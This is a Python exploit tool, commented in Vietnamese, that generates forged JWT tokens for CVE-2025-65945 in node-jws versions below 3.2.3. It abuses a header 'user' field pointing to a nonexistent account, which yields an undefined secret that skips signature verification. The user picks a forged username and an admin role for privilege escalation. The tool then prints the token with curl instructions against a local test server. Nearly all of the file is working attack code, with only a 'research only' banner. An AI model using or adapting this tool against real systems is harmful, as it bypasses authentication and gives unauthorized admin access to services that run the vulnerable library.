#!/usr/bin/env python3
"""
CVE-2025-65945 - JWT Exploit Token Generator

Tool này tạo JWT token giả mạo để khai thác lỗ hổng CVE-2025-65945
trong node-jws < 3.2.3.

Cách sử dụng:
    python jwt-exploit-generator.py

Sau đó nhập thông tin được yêu cầu để tạo forged JWT token.
"""

import base64
import json
import time
import hmac
import hashlib
from typing import Dict, Any

# Màu sắc cho terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def base64url_encode(data: bytes) -> str:
    """Encode data to base64url format (JWT standard)"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def base64url_decode(data: str) -> bytes:
    """Decode base64url format"""
    # Add padding if needed
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def create_jwt_token(header: Dict[str, Any], payload: Dict[str, Any], secret: str = "") -> str:
    """
    Tạo JWT token với header và payload cho trước
    
    Args:
        header: JWT header (dict)
        payload: JWT payload (dict)
        secret: Secret key để ký (default: empty string - for exploit)
    
    Returns:
        JWT token string
    """
    # Encode header
    header_json = json.dumps(header, separators=(',', ':')).encode('utf-8')
    header_b64 = base64url_encode(header_json)
    
    # Encode payload
    payload_json = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    payload_b64 = base64url_encode(payload_json)
    
    # Create signing input
    signing_input = f"{header_b64}.{payload_b64}"
    
    # Create signature (even with fake/empty secret)
    # For exploit, it doesn't matter what secret we use
    # because undefined secret will bypass verification
    algorithm = header.get('alg', 'HS256')
    
    if algorithm == 'HS256':
        hash_func = hashlib.sha256
    elif algorithm == 'HS384':
        hash_func = hashlib.sha384
    elif algorithm == 'HS512':
        hash_func = hashlib.sha512
    else:
        hash_func = hashlib.sha256
    
    signature = hmac.new(
        secret.encode('utf-8'),
        signing_input.encode('utf-8'),
        hash_func
    ).digest()
    
    signature_b64 = base64url_encode(signature)
    
    # Combine to create JWT
    jwt_token = f"{signing_input}.{signature_b64}"
    
    return jwt_token


def decode_jwt_token(token: str) -> Dict[str, Any]:
    """Decode JWT token để xem nội dung (không verify)"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        
        return {
            'header': header,
            'payload': payload,
            'signature': parts[2]
        }
    except Exception as e:
        print(f"{Colors.FAIL}Error decoding token: {e}{Colors.ENDC}")
        return None


def print_banner():
    """In banner của tool"""
    banner = f"""
{Colors.HEADER}╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-65945 - JWT Exploit Token Generator         ║
║   Improper Verification in node-jws < 3.2.3              ║
╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}

{Colors.WARNING}⚠️  CHỈ SỬ DỤNG CHO MỤC ĐÍCH NGHIÊN CỨU VÀ HỌC TẬP{Colors.ENDC}
"""
    print(banner)


def get_user_input():
    """Lấy input từ người dùng"""
    print(f"\n{Colors.OKBLUE}═══ Thông Tin JWT Token ═══{Colors.ENDC}\n")
    
    # Username
    username = input(f"{Colors.OKCYAN}[?] Username muốn giả mạo (default: admin): {Colors.ENDC}").strip()
    if not username:
        username = "admin"
    
    # Role
    print(f"\n{Colors.OKCYAN}[?] Role muốn claim:{Colors.ENDC}")
    print("    1. admin (Privilege Escalation)")
    print("    2. user")
    print("    3. Custom role")
    role_choice = input(f"{Colors.OKCYAN}[?] Chọn (1/2/3, default: 1): {Colors.ENDC}").strip()
    
    if role_choice == "2":
        role = "user"
    elif role_choice == "3":
        role = input(f"{Colors.OKCYAN}[?] Nhập custom role: {Colors.ENDC}").strip()
    else:
        role = "admin"
    
    # Header user field (non-existent user for exploit)
    print(f"\n{Colors.WARNING}[!] Header 'user' field - Phải là user KHÔNG TỒN TẠI để trigger lỗ hổng{Colors.ENDC}")
    header_user = input(f"{Colors.OKCYAN}[?] Header user field (default: nonexistent_user_12345): {Colors.ENDC}").strip()
    if not header_user:
        header_user = "nonexistent_user_12345"
    
    # Algorithm
    print(f"\n{Colors.OKCYAN}[?] Algorithm:{Colors.ENDC}")
    print("    1. HS256 (Recommended)")
    print("    2. HS384")
    print("    3. HS512")
    alg_choice = input(f"{Colors.OKCYAN}[?] Chọn (1/2/3, default: 1): {Colors.ENDC}").strip()
    
    if alg_choice == "2":
        algorithm = "HS384"
    elif alg_choice == "3":
        algorithm = "HS512"
    else:
        algorithm = "HS256"
    
    # Expiry time
    exp_hours = input(f"\n{Colors.OKCYAN}[?] Token expiry (giờ, default: 24): {Colors.ENDC}").strip()
    try:
        exp_hours = int(exp_hours) if exp_hours else 24
    except ValueError:
        exp_hours = 24
    
    exp_timestamp = int(time.time()) + (exp_hours * 3600)
    
    # Custom payload fields
    add_custom = input(f"\n{Colors.OKCYAN}[?] Thêm custom payload fields? (y/N): {Colors.ENDC}").strip().lower()
    custom_payload = {}
    if add_custom == 'y':
        while True:
            key = input(f"{Colors.OKCYAN}    Field name (Enter để kết thúc): {Colors.ENDC}").strip()
            if not key:
                break
            value = input(f"{Colors.OKCYAN}    Field value: {Colors.ENDC}").strip()
            custom_payload[key] = value
    
    return {
        'username': username,
        'role': role,
        'header_user': header_user,
        'algorithm': algorithm,
        'exp': exp_timestamp,
        'custom_payload': custom_payload
    }


def generate_exploit_token(config: Dict[str, Any]) -> str:
    """Tạo exploit JWT token"""
    # Create header
    header = {
        'alg': config['algorithm'],
        'typ': 'JWT',
        'user': config['header_user']  # Non-existent user - triggers vulnerability
    }
    
    # Create payload
    payload = {
        'username': config['username'],
        'role': config['role'],
        'exp': config['exp'],
        'iat': int(time.time())
    }
    
    # Add custom fields
    payload.update(config['custom_payload'])
    
    # Generate token with fake secret
    # Secret doesn't matter because it will be bypassed
    fake_secret = "any-random-fake-secret-for-exploit-12345"
    
    token = create_jwt_token(header, payload, fake_secret)
    
    return token


def print_token_info(token: str, config: Dict[str, Any]):
    """In thông tin về token đã tạo"""
    decoded = decode_jwt_token(token)
    
    print(f"\n{Colors.OKGREEN}{'='*60}")
    print(f"  ✓ JWT Token đã được tạo thành công!")
    print(f"{'='*60}{Colors.ENDC}\n")
    
    print(f"{Colors.OKBLUE}[*] Token Information:{Colors.ENDC}")
    print(f"    Length: {len(token)} characters")
    print(f"    Algorithm: {config['algorithm']}")
    print(f"    Username: {config['username']}")
    print(f"    Role: {config['role']}")
    print(f"    Header User: {config['header_user']} (non-existent)")
    print(f"    Expires: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(config['exp']))}")
    
    print(f"\n{Colors.WARNING}[*] Exploit Details:{Colors.ENDC}")
    print(f"    • Header 'user' field trỏ đến user không tồn tại")
    print(f"    • Server sẽ tra cứu và nhận undefined secret")
    print(f"    • Trong jws < 3.2.3: undefined secret = BYPASS verification!")
    print(f"    • Token này sẽ được chấp nhận mà không cần chữ ký đúng")
    
    print(f"\n{Colors.OKGREEN}[*] JWT Token:{Colors.ENDC}")
    print(f"\n{Colors.BOLD}{token}{Colors.ENDC}\n")
    
    # Decoded content
    if decoded:
        print(f"{Colors.OKBLUE}[*] Decoded Header:{Colors.ENDC}")
        print(f"    {json.dumps(decoded['header'], indent=4)}")
        
        print(f"\n{Colors.OKBLUE}[*] Decoded Payload:{Colors.ENDC}")
        print(f"    {json.dumps(decoded['payload'], indent=4)}")
    
    print(f"\n{Colors.OKCYAN}[*] Cách sử dụng token này:{Colors.ENDC}")
    print(f"    1. Copy token ở trên")
    print(f"    2. Gửi request với header: Authorization: Bearer <TOKEN>")
    print(f"    3. Hoặc paste vào web interface tại http://localhost:3000")
    print(f"\n{Colors.OKCYAN}[*] Test với cURL:{Colors.ENDC}")
    print(f'    curl http://localhost:3000/data \\')
    print(f'      -H "Authorization: Bearer {token[:50]}..."')
    
    print(f"\n{Colors.WARNING}[!] Nếu exploit thành công:{Colors.ENDC}")
    print(f"    ✓ Bạn sẽ nhận được admin data")
    print(f"    ✓ Mặc dù không có secret key đúng")
    print(f"    ✓ Đây là bằng chứng CVE-2025-65945 tồn tại!")
    print()


def save_token_to_file(token: str):
    """Lưu token vào file"""
    save = input(f"{Colors.OKCYAN}[?] Lưu token vào file? (y/N): {Colors.ENDC}").strip().lower()
    if save == 'y':
        filename = input(f"{Colors.OKCYAN}[?] Tên file (default: exploit_token.txt): {Colors.ENDC}").strip()
        if not filename:
            filename = "exploit_token.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write(token)
            print(f"{Colors.OKGREEN}[+] Token đã được lưu vào: {filename}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[-] Lỗi khi lưu file: {e}{Colors.ENDC}")


def main():
    """Main function"""
    print_banner()
    
    # Get user input
    config = get_user_input()
    
    # Generate token
    print(f"\n{Colors.WARNING}[*] Đang tạo forged JWT token...{Colors.ENDC}")
    token = generate_exploit_token(config)
    
    # Display token info
    print_token_info(token, config)
    
    # Save to file
    save_token_to_file(token)
    
    # Interactive mode
    while True:
        print(f"\n{Colors.OKBLUE}[?] Bạn muốn:{Colors.ENDC}")
        print("    1. Tạo token mới")
        print("    2. Decode một token")
        print("    3. Thoát")
        choice = input(f"{Colors.OKCYAN}[?] Chọn (1/2/3): {Colors.ENDC}").strip()
        
        if choice == "1":
            config = get_user_input()
            token = generate_exploit_token(config)
            print_token_info(token, config)
            save_token_to_file(token)
        elif choice == "2":
            token_input = input(f"\n{Colors.OKCYAN}[?] Nhập JWT token: {Colors.ENDC}").strip()
            decoded = decode_jwt_token(token_input)
            if decoded:
                print(f"\n{Colors.OKGREEN}[*] Header:{Colors.ENDC}")
                print(f"    {json.dumps(decoded['header'], indent=4)}")
                print(f"\n{Colors.OKGREEN}[*] Payload:{Colors.ENDC}")
                print(f"    {json.dumps(decoded['payload'], indent=4)}")
                print(f"\n{Colors.OKGREEN}[*] Signature:{Colors.ENDC}")
                print(f"    {decoded['signature']}")
        elif choice == "3":
            print(f"\n{Colors.OKGREEN}[*] Cảm ơn bạn đã sử dụng tool!{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Nhớ chỉ sử dụng cho mục đích nghiên cứu!{Colors.ENDC}\n")
            break
        else:
            print(f"{Colors.FAIL}[-] Lựa chọn không hợp lệ{Colors.ENDC}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[*] Goodbye!{Colors.ENDC}\n")
    except Exception as e:
        print(f"\n{Colors.FAIL}[-] Error: {e}{Colors.ENDC}\n")
